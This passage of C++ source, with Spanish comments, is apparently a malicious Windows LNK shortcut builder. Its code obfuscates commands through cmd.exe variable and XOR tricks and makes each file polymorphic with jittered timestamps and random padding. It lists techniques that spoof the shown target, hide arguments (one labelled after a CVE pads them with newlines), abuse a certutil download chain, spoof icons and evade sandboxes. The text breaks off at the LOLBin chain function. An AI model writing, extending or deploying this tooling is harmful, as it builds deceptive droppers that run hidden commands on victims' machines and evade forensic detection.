    // Derivar clave del nombre del equipo
    char computerName[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameA(computerName, &size);

    std::string key(computerName);
    if (!envKey.empty()) {
        key = envKey;
    }

    for (size_t i = 0; i < input.size(); ++i) {
        result.push_back(input[i] ^ key[i % key.size()]);
    }

    return result;
}

// Metodo 4: Reversed strings
inline std::string reverseObfuscation(const std::string& input) {
    std::string reversed(input.rbegin(), input.rend());
    return "cmd.exe /c \"set X=" + reversed + " & call %X:~- " + std::to_string(input.size()) + "%\"";
}

// Selector automatico de metodo
inline std::string obfuscate(const std::string& input, int method = 0) {
    if (method == 0) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(1, 3);
        method = dist(gen);
    }

    switch (method) {
        case 1: return charFragmentation(input);
        case 2: return envSubstitution(input);
        case 3: return reverseObfuscation(input);
        default: return charFragmentation(input);
    }
}

} // namespace envobf

// =============================================================================
// SECCION 10: MEJORA 7 - Polimorfismo y Generacion Masiva
// =============================================================================
namespace polymorph {

// Tipos de mutaciones validas
enum class MutationType {
    JITTER_TIMESTAMPS,
    TRAILING_PADDING,
    MUTATE_RESERVED,
    VARY_FILE_ATTR,
    VARY_SHOW_CMD,
    ENVIRONMENT_PADDING,
    EXTRA_BLOCK_INSERTION
};

struct MutationConfig {
    double probability;
    int intensity;
};

class PolymorphicMutator {
public:
    PolymorphicMutator() : gen_(rd_()) {}

    // Jitter de timestamps
    void jitterTimestamps(FILETIME& creation, FILETIME& modification, FILETIME& access, int maxSeconds) {
        std::uniform_int_distribution<> jitter(-maxSeconds, maxSeconds);

        auto applyJitter = [&jitter, this](FILETIME& ft, int deltaSeconds) {
            ULARGE_INTEGER uli;
            uli.LowPart = ft.dwLowDateTime;
            uli.HighPart = ft.dwHighDateTime;

            // Convertir a segundos y aplicar jitter
            uli.QuadPart += static_cast<ULONGLONG>(deltaSeconds) * 10000000ULL;

            ft.dwLowDateTime = uli.LowPart;
            ft.dwHighDateTime = uli.HighPart;
        };

        applyJitter(creation, jitter(gen_));
        applyJitter(modification, jitter(gen_));
        applyJitter(access, jitter(gen_));

        // Mantener coherencia: creation <= modification <= access
        // (simplificacion: no reordenamos, solo ajustamos)
    }

    // Padding aleatorio al final
    void addTrailingPadding(std::vector<uint8_t>& data, size_t minBytes, size_t maxBytes) {
        std::uniform_int_distribution<> sizeDist(minBytes, maxBytes);
        std::uniform_int_distribution<> byteDist(0, 255);

        size_t paddingSize = sizeDist(gen_);
        for (size_t i = 0; i < paddingSize; ++i) {
            data.push_back(static_cast<uint8_t>(byteDist(gen_)));
        }
    }

    // Mutar bytes reservados del header
    void mutateReservedBytes(std::vector<uint8_t>& headerData) {
        if (headerData.size() < spec::Sizes::HEADER) return;

        std::uniform_int_distribution<> byteDist(0, 255);

        // Reserved fields en offsets 0x40-0x4B (12 bytes)
        for (size_t i = 0x40; i <= 0x4B && i < headerData.size(); ++i) {
            headerData[i] = static_cast<uint8_t>(byteDist(gen_));
        }
    }

    // Variar atributos de archivo (bits no criticos)
    uint32_t varyFileAttributes(uint32_t original) {
        std::uniform_int_distribution<> bitDist(0, 1);

        // Solo variar bits que no afectan funcionalidad critica
        // Archive y Hidden pueden variar
        if (bitDist(gen_)) original |= static_cast<uint32_t>(spec::FileAttr::Archive);
        if (bitDist(gen_) && !(original & static_cast<uint32_t>(spec::FileAttr::System))) {
            original |= static_cast<uint32_t>(spec::FileAttr::Hidden);
        }

        return original;
    }

    // Variar show command
    spec::ShowCmd varyShowCommand(spec::ShowCmd original) {
        std::uniform_int_distribution<> dist(0, 10);

        // 70% mantener original, 15% maximized, 15% minimized
        int r = dist(gen_);
        if (r < 7) return original;
        if (r < 9) return spec::ShowCmd::Maximized;
        return spec::ShowCmd::MinNoActive;
    }

    // Generar bloque extra falso
    std::vector<uint8_t> generateFakeExtraBlock() {
        std::vector<uint8_t> block;
        std::uniform_int_distribution<> sizeDist(16, 64);
        std::uniform_int_distribution<uint32_t> sigDist(0xA0000002, 0xAFFFFFFF);
        std::uniform_int_distribution<> byteDist(0, 255);

        uint32_t size = sizeDist(gen_);
        uint32_t signature = sigDist(gen_);

        auto sizeBytes = core::ByteEncoder::toLE(size);
        auto sigBytes = core::ByteEncoder::toLE(signature);

        block.insert(block.end(), sizeBytes.begin(), sizeBytes.end());
        block.insert(block.end(), sigBytes.begin(), sigBytes.end());

        while (block.size() < size) {
            block.push_back(static_cast<uint8_t>(byteDist(gen_)));
        }

        return block;
    }

private:
    std::random_device rd_;
    std::mt19937 gen_;
};

// Generar hash SHA-256 simplificado (para verificacion de unicidad)
inline std::array<uint8_t, 32> simpleHash(const std::vector<uint8_t>& data) {
    std::array<uint8_t, 32> hash = {};
    uint32_t crc = core::ByteEncoder::crc32(data);

    // Hash simplificado basado en CRC32 + mixing
    for (size_t i = 0; i < 32; ++i) {
        hash[i] = static_cast<uint8_t>((crc >> ((i % 4) * 8)) ^ (i * 0x37));
    }

    return hash;
}

} // namespace polymorph

// =============================================================================
// SECCION 11: Estructuras del Formato LNK
// =============================================================================
namespace blocks {

class ShellLinkHeader {
    spec::LinkFlag linkFlags_ = spec::LinkFlag::None;
    spec::FileAttr fileAttrs_ = spec::FileAttr::Normal;
    spec::ShowCmd showCmd_ = spec::ShowCmd::Normal;
    uint32_t iconIndex_ = 0;
    FILETIME creationTime_ = {};
    FILETIME accessTime_ = {};
    FILETIME writeTime_ = {};
    uint32_t fileSize_ = 0;

public:
    ShellLinkHeader& setFlags(spec::LinkFlag flags) { linkFlags_ = flags; return *this; }
    ShellLinkHeader& addFlag(spec::LinkFlag flag) { linkFlags_ |= flag; return *this; }
    ShellLinkHeader& setFileAttrs(spec::FileAttr attrs) { fileAttrs_ = attrs; return *this; }
    ShellLinkHeader& setShowCmd(spec::ShowCmd cmd) { showCmd_ = cmd; return *this; }
    ShellLinkHeader& setIconIndex(uint32_t idx) { iconIndex_ = idx; return *this; }
    ShellLinkHeader& setFileSize(uint32_t size) { fileSize_ = size; return *this; }

    ShellLinkHeader& setTimestamps(FILETIME created, FILETIME accessed, FILETIME written) {
        creationTime_ = created;
        accessTime_ = accessed;
        writeTime_ = written;
        return *this;
    }

    ShellLinkHeader& setRandomTimestamps() {
        auto ts = forensic::generateForensicTimestamps();
        creationTime_ = ts.creation;
        accessTime_ = ts.access;
        writeTime_ = ts.modification;
        return *this;
    }

    [[nodiscard]] std::vector<uint8_t> serialize() const {
        std::vector<uint8_t> out;
        out.reserve(spec::Sizes::HEADER);

        auto sz = core::ByteEncoder::toLE(spec::Sizes::HEADER);
        out.insert(out.end(), sz.begin(), sz.end());

        out.insert(out.end(), spec::Guid::SHELL_LINK.begin(), spec::Guid::SHELL_LINK.end());

        auto flags = core::ByteEncoder::toLE(static_cast<uint32_t>(linkFlags_));
        out.insert(out.end(), flags.begin(), flags.end());

        auto attrs = core::ByteEncoder::toLE(static_cast<uint32_t>(fileAttrs_));
        out.insert(out.end(), attrs.begin(), attrs.end());

        // Timestamps
        auto cLow = core::ByteEncoder::toLE(creationTime_.dwLowDateTime);
        out.insert(out.end(), cLow.begin(), cLow.end());
        auto cHigh = core::ByteEncoder::toLE(creationTime_.dwHighDateTime);
        out.insert(out.end(), cHigh.begin(), cHigh.end());

        auto aLow = core::ByteEncoder::toLE(accessTime_.dwLowDateTime);
        out.insert(out.end(), aLow.begin(), aLow.end());
        auto aHigh = core::ByteEncoder::toLE(accessTime_.dwHighDateTime);
        out.insert(out.end(), aHigh.begin(), aHigh.end());

        auto wLow = core::ByteEncoder::toLE(writeTime_.dwLowDateTime);
        out.insert(out.end(), wLow.begin(), wLow.end());
        auto wHigh = core::ByteEncoder::toLE(writeTime_.dwHighDateTime);
        out.insert(out.end(), wHigh.begin(), wHigh.end());

        auto fs = core::ByteEncoder::toLE(fileSize_);
        out.insert(out.end(), fs.begin(), fs.end());

        auto icon = core::ByteEncoder::toLE(iconIndex_);
        out.insert(out.end(), icon.begin(), icon.end());

        auto show = core::ByteEncoder::toLE(static_cast<uint32_t>(showCmd_));
        out.insert(out.end(), show.begin(), show.end());

        // HotKey + Reserved (12 bytes)
        out.insert(out.end(), 12, 0x00);

        return out;
    }

    [[nodiscard]] spec::LinkFlag flags() const { return linkFlags_; }
    [[nodiscard]] spec::FileAttr fileAttrs() const { return fileAttrs_; }
    [[nodiscard]] spec::ShowCmd showCmd() const { return showCmd_; }

    void mutateReserved() {
        // Los bytes reservados ya estan en cero, no mutamos aqui
    }
};

class ItemID {
    std::vector<uint8_t> data_;
public:
    explicit ItemID(std::vector<uint8_t> data) : data_(std::move(data)) {}
    [[nodiscard]] std::vector<uint8_t> serialize() const {
        std::vector<uint8_t> out;
        uint16_t size = static_cast<uint16_t>(data_.size() + 2);
        auto sz = core::ByteEncoder::toLE(size);
        out.insert(out.end(), sz.begin(), sz.end());
        out.insert(out.end(), data_.begin(), data_.end());
        return out;
    }
    [[nodiscard]] size_t size() const { return data_.size() + 2; }
};

class LinkTargetIDList {
    std::vector<ItemID> items_;
public:
    LinkTargetIDList() = default;
    explicit LinkTargetIDList(std::vector<ItemID> items) : items_(std::move(items)) {}
    void addItem(ItemID item) { items_.push_back(std::move(item)); }

    [[nodiscard]] std::vector<uint8_t> serialize() const {
        std::vector<uint8_t> out;
        uint32_t totalSize = 2;
        for (const auto& item : items_) {
            totalSize += static_cast<uint32_t>(item.size());
        }

        auto sz = core::ByteEncoder::toLE(static_cast<uint16_t>(totalSize));
        out.insert(out.end(), sz.begin(), sz.end());

        for (const auto& item : items_) {
            auto serialized = item.serialize();
            out.insert(out.end(), serialized.begin(), serialized.end());
        }

        out.push_back(0x00);
        out.push_back(0x00);
        return out;
    }

    [[nodiscard]] static LinkTargetIDList fromPath(const std::string& path) {
        LinkTargetIDList idList;

        if (path.length() < 3 || !std::isalpha(static_cast<unsigned char>(path[0])) || path[1] != ':') {
            throw std::runtime_error("Invalid path format: " + path);
        }

        char drive = static_cast<char>(std::toupper(static_cast<unsigned char>(path[0])));

        std::vector<uint8_t> computerItem(spec::ItemConsts::COMPUTER.begin(),
                                          spec::ItemConsts::COMPUTER.end());
        idList.addItem(ItemID(computerItem));

        std::vector<uint8_t> driveItem = {0x2F, static_cast<uint8_t>(drive), 0x3A, 0x5C};
        driveItem.resize(23, 0x00);
        idList.addItem(ItemID(driveItem));

        std::string remainder = path.substr(3);
        if (remainder.empty()) return idList;

        std::istringstream stream(remainder);
        std::string component;

        while (std::getline(stream, component, '\\')) {
            if (component.empty()) continue;

            bool isFile = (component.find('.') != std::string::npos);
            std::vector<uint8_t> itemData;

            uint8_t itemType = isFile ?
                (spec::ItemConsts::ITEM_IS_FILE | spec::ItemConsts::ITEM_HAS_UNICODE) :
                (spec::ItemConsts::ITEM_IS_DIRECTORY | spec::ItemConsts::ITEM_HAS_UNICODE);

            itemData.push_back(itemType);
            itemData.push_back(0x00);
            itemData.insert(itemData.end(), 8, 0x00);

            auto attr = isFile ? spec::FileAttr::Normal : spec::FileAttr::Directory;
            itemData.push_back(static_cast<uint8_t>(attr));
            itemData.push_back(0x00);

            auto nameBytes = core::ByteEncoder::toUTF16LE(component);
            itemData.insert(itemData.end(), nameBytes.begin(), nameBytes.end());
            itemData.push_back(0x00);
            itemData.push_back(0x00);

            idList.addItem(ItemID(std::move(itemData)));
        }

        return idList;
    }
};

// LinkInfo con metadatos forenses
class LinkInfo {
    spec::LinkInfoFlag flags_ = spec::LinkInfoFlag::VolumeIDAndLocalBasePath;
    std::string localPath_;
    std::string commonPathSuffix_;
    std::string networkPath_;
    uint32_t volumeSerial_ = 0;
    std::string volumeLabel_;

public:
    LinkInfo& setFlags(spec::LinkInfoFlag flags) { flags_ = flags; return *this; }
    LinkInfo& setLocalBasePath(const std::string& path) { localPath_ = path; return *this; }
    LinkInfo& setCommonPathSuffix(const std::string& suffix) { commonPathSuffix_ = suffix; return *this; }
    LinkInfo& setNetworkPath(const std::string& path) { networkPath_ = path; return *this; }

    LinkInfo& setVolumeSerial(uint32_t serial) { volumeSerial_ = serial; return *this; }
    LinkInfo& setVolumeLabel(const std::string& label) { volumeLabel_ = label; return *this; }

    LinkInfo& setRealisticVolumeInfo() {
        volumeSerial_ = forensic::generateRealisticVolumeSerial();
        volumeLabel_ = forensic::selectVolumeLabel();
        return *this;
    }

    [[nodiscard]] std::vector<uint8_t> serialize() const {
        std::vector<uint8_t> out;

        bool useNetwork = (static_cast<uint32_t>(flags_) &
                          static_cast<uint32_t>(spec::LinkInfoFlag::CommonNetworkRelativeLinkAndPathSuffix)) != 0;

        uint32_t headerSize = 0x1C;

        std::vector<uint8_t> body;

        // Flags
        auto flags = core::ByteEncoder::toLE(static_cast<uint32_t>(flags_));
        body.insert(body.end(), flags.begin(), flags.end());

        // VolumeIDOffset
        auto volOff = core::ByteEncoder::toLE(headerSize);
        body.insert(body.end(), volOff.begin(), volOff.end());

        // LocalBasePathOffset
        uint32_t localOff = useNetwork ? 0 : headerSize;
        auto localOffBytes = core::ByteEncoder::toLE(localOff);
        body.insert(body.end(), localOffBytes.begin(), localOffBytes.end());

        // NetworkOffset
        uint32_t netOff = useNetwork ? headerSize : 0;
        auto netOffBytes = core::ByteEncoder::toLE(netOff);
        body.insert(body.end(), netOffBytes.begin(), netOffBytes.end());

        // CommonPathSuffixOffset (placeholder)
        auto suffixOff = core::ByteEncoder::toLE(0u);
        body.insert(body.end(), suffixOff.begin(), suffixOff.end());

        std::vector<uint8_t> networkBlock;

        if (useNetwork) {
            networkBlock = createNetworkRelativeLink(networkPath_.empty() ? localPath_ : networkPath_);
            uint32_t newSuffixOff = headerSize + static_cast<uint32_t>(networkBlock.size());
            auto newOff = core::ByteEncoder::toLE(newSuffixOff);
            std::copy(newOff.begin(), newOff.end(), body.begin() + 16);
            body.insert(body.end(), networkBlock.begin(), networkBlock.end());
        } else if (!localPath_.empty()) {
            body.insert(body.end(), localPath_.begin(), localPath_.end());
            body.push_back(0x00);
        }

        body.insert(body.end(), commonPathSuffix_.begin(), commonPathSuffix_.end());
        body.push_back(0x00);

        uint32_t totalSize = static_cast<uint32_t>(body.size() + 8);

        auto sizeBytes = core::ByteEncoder::toLE(totalSize);
        out.insert(out.end(), sizeBytes.begin(), sizeBytes.end());

        auto headerBytes = core::ByteEncoder::toLE(headerSize);
        out.insert(out.end(), headerBytes.begin(), headerBytes.end());

        out.insert(out.end(), body.begin(), body.end());

        return out;
    }

private:
    [[nodiscard]] static std::vector<uint8_t> createNetworkRelativeLink(const std::string& path) {
        std::string netName = path.substr(0, path.find_last_of('\\'));
        netName += '\0';

        std::vector<uint8_t> body;

        auto netOff = core::ByteEncoder::toLE(0x14u);
        body.insert(body.end(), netOff.begin(), netOff.end());

        body.insert(body.end(), 4, 0x00);

        auto provider = core::ByteEncoder::toLE(0x00140000u);
        body.insert(body.end(), provider.begin(), provider.end());

        body.insert(body.end(), netName.begin(), netName.end());

        uint32_t size = static_cast<uint32_t>(body.size() + 4);

        std::vector<uint8_t> out;
        auto sizeBytes = core::ByteEncoder::toLE(size);
        out.insert(out.end(), sizeBytes.begin(), sizeBytes.end());
        out.insert(out.end(), body.begin(), body.end());

        return out;
    }
};

class EnvironmentVariableBlock {
    std::string ansiTarget_;
    std::string unicodeTarget_;

public:
    EnvironmentVariableBlock& setAnsiTarget(const std::string& target) {
        ansiTarget_ = target;
        return *this;
    }

    EnvironmentVariableBlock& setUnicodeTarget(const std::string& target) {
        unicodeTarget_ = target;
        return *this;
    }

    EnvironmentVariableBlock& setBoth(const std::string& target) {
        ansiTarget_ = target;
        unicodeTarget_ = target;
        return *this;
    }

    [[nodiscard]] std::vector<uint8_t> serialize() const {
        std::vector<uint8_t> out;
        out.reserve(spec::Sizes::ENV_BLOCK);

        auto size = core::ByteEncoder::toLE(spec::Sizes::ENV_BLOCK);
        out.insert(out.end(), size.begin(), size.end());

        auto sig = core::ByteEncoder::toLE(spec::BlockSignature::ENVIRONMENT_VARIABLES);
        out.insert(out.end(), sig.begin(), sig.end());

        std::vector<uint8_t> ansi(ansiTarget_.begin(), ansiTarget_.end());
        ansi.push_back(0x00);
        ansi.resize(spec::Sizes::MAX_PATH_ANSI, 0x00);
        out.insert(out.end(), ansi.begin(), ansi.end());

        std::wstring wtarget(unicodeTarget_.begin(), unicodeTarget_.end());
        for (wchar_t wc : wtarget) {
            out.push_back(static_cast<uint8_t>(wc & 0xFF));
            out.push_back(static_cast<uint8_t>((wc >> 8) & 0xFF));
        }
        out.push_back(0x00);
        out.push_back(0x00);

        size_t currentUniSize = (wtarget.size() + 1) * 2;
        if (currentUniSize < spec::Sizes::MAX_PATH_UNICODE) {
            size_t paddingSize = spec::Sizes::MAX_PATH_UNICODE - currentUniSize;
            out.insert(out.end(), paddingSize, 0x00);
        }

        out.insert(out.end(), 4, 0x00);

        return out;
    }
};

class StringData {
    std::string arguments_;
    std::string iconPath_;
    std::string workingDir_;
    bool unicode_ = true;

public:
    StringData& setArguments(const std::string& args) { arguments_ = args; return *this; }
    StringData& setIconPath(const std::string& path) { iconPath_ = path; return *this; }
    StringData& setWorkingDir(const std::string& dir) { workingDir_ = dir; return *this; }
    StringData& setUnicode(bool uni) { unicode_ = uni; return *this; }

    [[nodiscard]] std::vector<uint8_t> serialize() const {
        std::vector<uint8_t> out;

        if (!arguments_.empty()) appendPascalString(out, arguments_);
        if (!iconPath_.empty()) appendPascalString(out, iconPath_);
        if (!workingDir_.empty()) appendPascalString(out, workingDir_);

        return out;
    }

private:
    void appendPascalString(std::vector<uint8_t>& out, const std::string& str) const {
        if (unicode_) {
            std::wstring wstr(str.begin(), str.end());
            uint16_t len = static_cast<uint16_t>(wstr.size());
            auto lenBytes = core::ByteEncoder::toLE(len);
            out.insert(out.end(), lenBytes.begin(), lenBytes.end());

            for (wchar_t wc : wstr) {
                out.push_back(static_cast<uint8_t>(wc & 0xFF));
                out.push_back(static_cast<uint8_t>((wc >> 8) & 0xFF));
            }
        } else {
            uint16_t len = static_cast<uint16_t>(str.size());
            auto lenBytes = core::ByteEncoder::toLE(len);
            out.insert(out.end(), lenBytes.begin(), lenBytes.end());
            out.insert(out.end(), str.begin(), str.end());
        }
    }
};

class KnownFolderBlock {
    std::array<uint8_t, 16> folderGuid_;
    std::string folderName_;

public:
    KnownFolderBlock& setFolderGuid(const std::array<uint8_t, 16>& guid) {
        folderGuid_ = guid;
        return *this;
    }

    KnownFolderBlock& setFolderName(const std::string& name) {
        folderName_ = name;
        return *this;
    }

    static KnownFolderBlock createDocuments() {
        KnownFolderBlock block;
        block.folderGuid_ = {
            0xD0, 0x9A, 0xD3, 0xFD, 0x8F, 0x23, 0xAF, 0x46,
            0xAD, 0xB4, 0x6C, 0x85, 0x48, 0x03, 0x69, 0xC7
        };
        block.folderName_ = "Documents";
        return block;
    }

    [[nodiscard]] std::vector<uint8_t> serialize() const {
        std::vector<uint8_t> out;

        auto size = core::ByteEncoder::toLE(spec::Sizes::KNOWN_FOLDER_BLOCK);
        out.insert(out.end(), size.begin(), size.end());

        auto sig = core::ByteEncoder::toLE(spec::BlockSignature::KNOWN_FOLDER);
        out.insert(out.end(), sig.begin(), sig.end());

        auto offset = core::ByteEncoder::toLE(0x00000014u);
        out.insert(out.end(), offset.begin(), offset.end());

        out.insert(out.end(), 4, 0x00);
        out.insert(out.end(), folderGuid_.begin(), folderGuid_.end());

        auto nameOff = core::ByteEncoder::toLE(0x00000024u);
        out.insert(out.end(), nameOff.begin(), nameOff.end());

        out.insert(out.end(), 4, 0x00);
        out.insert(out.end(), folderName_.begin(), folderName_.end());
        out.push_back(0x00);

        while (out.size() < spec::Sizes::KNOWN_FOLDER_BLOCK) {
            out.push_back(0x00);
        }

        return out;
    }
};

inline std::vector<uint8_t> terminatorBlock() {
    return {0x00, 0x00, 0x00, 0x00};
}

} // namespace blocks

// =============================================================================
// SECCION 12: Generador de LNK Mejorado
// =============================================================================
enum class LnkTechnique {
    SPOOFEXE_SHOWARGS_ENABLETARGET,
    REALEXE_HIDEARGS_DISABLETARGET,
    SPOOFEXE_OVERFLOWARGS_DISABLETARGET,
    SPOOFEXE_HIDEARGS_DISABLETARGET,
    CVE20259491,
    // Nuevas tecnicas v4
    LOLBIN_CHAIN,
    FILE_SMUGGLING,
    ANTI_SANDBOX
};

struct LnkGenParams {
    std::string targetExe;
    std::string targetArgs;
    std::string fakePath;
    std::string iconPath;
    uint32_t iconIndex = 0;

    // Nuevos parametros v4
    std::string outputPath = "shortcut.lnk";
    std::string lolbinMethod = "certutil";
    std::string downloadUrl;
    std::string outputFilename;
    int antiSandboxDelay = 0;
    int obfuscationMethod = 0;
    bool useAntiSandbox = false;
    bool useObfuscation = false;
    bool useIconSpoofing = true;
};

class LnkGenerator {
public:
    [[nodiscard]] static std::vector<uint8_t> generate(LnkTechnique tech, const LnkGenParams& params) {
        switch (tech) {
            case LnkTechnique::SPOOFEXE_SHOWARGS_ENABLETARGET:
                return genSpoofExeShowArgs(params);
            case LnkTechnique::REALEXE_HIDEARGS_DISABLETARGET:
                return genRealExeHideArgsDisableTarget(params);
            case LnkTechnique::SPOOFEXE_OVERFLOWARGS_DISABLETARGET:
                return genOverflow(params);
            case LnkTechnique::SPOOFEXE_HIDEARGS_DISABLETARGET:
                return genSpoofExeHideArgsDisableTarget(params);
            case LnkTechnique::CVE20259491:
                return genCVE20259491(params);
            case LnkTechnique::LOLBIN_CHAIN:
                return genLolBinChain(params);
            case LnkTechnique::FILE_SMUGGLING:
                return genFileSmuggling(params);
            case LnkTechnique::ANTI_SANDBOX:
                return genAntiSandbox(params);
            default:
                throw std::runtime_error("Unknown technique");
        }
    }

    // Determinar icono automaticamente
    static void autoConfigureIcon(LnkGenParams& params) {
        if (params.useIconSpoofing && params.iconPath.empty()) {
            std::string ext = iconspoofer::inferExtensionFromPath(params.fakePath);
            auto mapping = iconspoofer::getIconForExtension(ext);
            params.iconPath = iconspoofer::getSystemIconPath(mapping.dll);
            params.iconIndex = mapping.index;
        }
    }

private:
    [[nodiscard]] static std::vector<uint8_t> genSpoofExeShowArgs(const LnkGenParams& p) {
        blocks::ShellLinkHeader header;
        header.setFlags(spec::LinkFlag::HasLinkTargetIDList |
                        spec::LinkFlag::HasIconLocation |
                        spec::LinkFlag::HasExpString |
                        spec::LinkFlag::IsUnicode |
                        spec::LinkFlag::PreferEnvironmentPath);

        if (!p.targetArgs.empty()) {
            header.addFlag(spec::LinkFlag::HasArguments);
        }

        header.setIconIndex(p.iconIndex);
        header.setRandomTimestamps();

        auto idList = blocks::LinkTargetIDList::fromPath(p.fakePath);

        blocks::StringData strings;
        strings.setUnicode(true);
        if (!p.targetArgs.empty()) {
            strings.setArguments(p.targetArgs);
        }
        strings.setIconPath(p.iconPath);

        blocks::EnvironmentVariableBlock envBlock;
        envBlock.setBoth(p.targetExe);

        std::vector<uint8_t> lnk;
        auto hdr = header.serialize();
        lnk.insert(lnk.end(), hdr.begin(), hdr.end());

        auto idl = idList.serialize();
        lnk.insert(lnk.end(), idl.begin(), idl.end());

        auto str = strings.serialize();
        lnk.insert(lnk.end(), str.begin(), str.end());

        auto env = envBlock.serialize();
        lnk.insert(lnk.end(), env.begin(), env.end());

        auto term = blocks::terminatorBlock();
        lnk.insert(lnk.end(), term.begin(), term.end());

        return lnk;
    }

    [[nodiscard]] static std::vector<uint8_t> genRealExeHideArgsDisableTarget(const LnkGenParams& p) {
        blocks::ShellLinkHeader header;
        header.setFlags(spec::LinkFlag::HasLinkTargetIDList |
                        spec::LinkFlag::HasIconLocation |
                        spec::LinkFlag::IsUnicode |
                        spec::LinkFlag::HasExpString |
                        spec::LinkFlag::EnableTargetMetadata |
                        spec::LinkFlag::PreferEnvironmentPath);

        if (!p.targetArgs.empty()) {
            header.addFlag(spec::LinkFlag::HasArguments);
        }

        header.setIconIndex(p.iconIndex);
        header.setRandomTimestamps();

        auto idList = blocks::LinkTargetIDList::fromPath(p.targetExe);

        blocks::StringData strings;
        strings.setArguments(p.targetArgs).setIconPath(p.iconPath).setUnicode(true);

        blocks::EnvironmentVariableBlock envBlock;
        std::string fakeTarget = p.fakePath.empty() ?
            "C:\\Windows\\System32\\notepad.exe" : p.fakePath;
        envBlock.setAnsiTarget(fakeTarget).setUnicodeTarget(fakeTarget);

        auto knownFolder = blocks::KnownFolderBlock::createDocuments();

        std::vector<uint8_t> lnk;

        auto hdr = header.serialize();
        lnk.insert(lnk.end(), hdr.begin(), hdr.end());

        auto idl = idList.serialize();
        lnk.insert(lnk.end(), idl.begin(), idl.end());

        auto str = strings.serialize();
        lnk.insert(lnk.end(), str.begin(), str.end());

        auto env = envBlock.serialize();
        lnk.insert(lnk.end(), env.begin(), env.end());

        auto kf = knownFolder.serialize();
        lnk.insert(lnk.end(), kf.begin(), kf.end());

        auto term = blocks::terminatorBlock();
        lnk.insert(lnk.end(), term.begin(), term.end());

        // Padding aleatorio
        polymorph::PolymorphicMutator mutator;
        mutator.addTrailingPadding(lnk, 16, 64);

        return lnk;
    }

    [[nodiscard]] static std::vector<uint8_t> genOverflow(const LnkGenParams& p) {
        blocks::ShellLinkHeader header;
        header.setFlags(spec::LinkFlag::HasLinkTargetIDList |
                        spec::LinkFlag::HasLinkInfo |
                        spec::LinkFlag::HasIconLocation |
                        spec::LinkFlag::IsUnicode |
                        spec::LinkFlag::HasExpString |
                        spec::LinkFlag::EnableTargetMetadata);

        if (!p.targetArgs.empty()) {
            header.addFlag(spec::LinkFlag::HasArguments);
        }

        header.setIconIndex(p.iconIndex);
        header.setRandomTimestamps();

        blocks::LinkTargetIDList idList;

        std::vector<uint8_t> computer(spec::ItemConsts::COMPUTER.begin(),
                                      spec::ItemConsts::COMPUTER.end());
        idList.addItem(blocks::ItemID(computer));

        std::vector<uint8_t> drive = {0x2F, 0x43, 0x3A, 0x5C};
        drive.resize(23, 0x00);
        idList.addItem(blocks::ItemID(drive));

        std::vector<uint8_t> overflowItem = {0x36, 0x00};
        overflowItem.insert(overflowItem.end(), 8, 0x00);
        overflowItem.push_back(0x80);
        overflowItem.push_back(0x00);

        std::wstring longName(1000, L'_');
        for (wchar_t wc : longName) {
            overflowItem.push_back(static_cast<uint8_t>(wc & 0xFF));
            overflowItem.push_back(static_cast<uint8_t>((wc >> 8) & 0xFF));
        }
        overflowItem.push_back(0x00);
        overflowItem.push_back(0x00);
        idList.addItem(blocks::ItemID(overflowItem));

        blocks::LinkInfo linkInfo;
        linkInfo.setFlags(spec::LinkInfoFlag::CommonNetworkRelativeLinkAndPathSuffix)
                .setNetworkPath(p.targetExe)
                .setRealisticVolumeInfo();

        blocks::StringData strings;
        strings.setArguments(p.targetArgs).setIconPath(p.iconPath).setUnicode(true);

        blocks::EnvironmentVariableBlock envBlock;
        envBlock.setBoth(p.fakePath);

        std::vector<uint8_t> lnk;

        auto hdr = header.serialize();
        lnk.insert(lnk.end(), hdr.begin(), hdr.end());

        auto idl = idList.serialize();
        lnk.insert(lnk.end(), idl.begin(), idl.end());

        auto li = linkInfo.serialize();
        lnk.insert(lnk.end(), li.begin(), li.end());

        auto str = strings.serialize();
        lnk.insert(lnk.end(), str.begin(), str.end());

        auto env = envBlock.serialize();
        lnk.insert(lnk.end(), env.begin(), env.end());

        auto term = blocks::terminatorBlock();
        lnk.insert(lnk.end(), term.begin(), term.end());

        return lnk;
    }

    [[nodiscard]] static std::vector<uint8_t> genSpoofExeHideArgsDisableTarget(const LnkGenParams& p) {
        blocks::ShellLinkHeader header;
        header.setFlags(spec::LinkFlag::HasLinkTargetIDList |
                        spec::LinkFlag::HasIconLocation |
                        spec::LinkFlag::HasExpString |
                        spec::LinkFlag::PreferEnvironmentPath);

        if (!p.targetArgs.empty()) {
            header.addFlag(spec::LinkFlag::HasArguments);
        }

        header.setIconIndex(p.iconIndex);
        header.setRandomTimestamps();

        auto idList = blocks::LinkTargetIDList::fromPath(p.fakePath);

        blocks::StringData strings;
        strings.setArguments(p.targetArgs).setIconPath(p.iconPath).setUnicode(false);

        blocks::EnvironmentVariableBlock envBlock;
        envBlock.setAnsiTarget(p.targetExe).setUnicodeTarget("");

        std::vector<uint8_t> lnk;

        auto hdr = header.serialize();
        lnk.insert(lnk.end(), hdr.begin(), hdr.end());

        auto idl = idList.serialize();
        lnk.insert(lnk.end(), idl.begin(), idl.end());

        auto str = strings.serialize();
        lnk.insert(lnk.end(), str.begin(), str.end());

        auto env = envBlock.serialize();
        lnk.insert(lnk.end(), env.begin(), env.end());

        auto term = blocks::terminatorBlock();
        lnk.insert(lnk.end(), term.begin(), term.end());

        return lnk;
    }

    [[nodiscard]] static std::vector<uint8_t> genCVE20259491(const LnkGenParams& p) {
        blocks::ShellLinkHeader header;
        header.setFlags(spec::LinkFlag::HasArguments |
                        spec::LinkFlag::HasIconLocation |
                        spec::LinkFlag::HasExpString);

        header.setIconIndex(p.iconIndex);
        header.setRandomTimestamps();

        std::string paddedArgs;
        for (int i = 0; i < 128; ++i) {
            paddedArgs += "\x0A\x0D";
        }
        paddedArgs += p.targetArgs;

        blocks::StringData strings;
        strings.setArguments(paddedArgs).setIconPath(p.iconPath).setUnicode(false);

        blocks::EnvironmentVariableBlock envBlock;
        envBlock.setBoth(p.targetExe);

        std::vector<uint8_t> lnk;

        auto hdr = header.serialize();
        lnk.insert(lnk.end(), hdr.begin(), hdr.end());

        auto str = strings.serialize();
        lnk.insert(lnk.end(), str.begin(), str.end());

        auto env = envBlock.serialize();
        lnk.insert(lnk.end(), env.begin(), env.end());

        auto term = blocks::terminatorBlock();
        lnk.insert(lnk.end(), term.begin(), term.end());

        return lnk;
    }

    // NUEVA: Cadena LOLBin
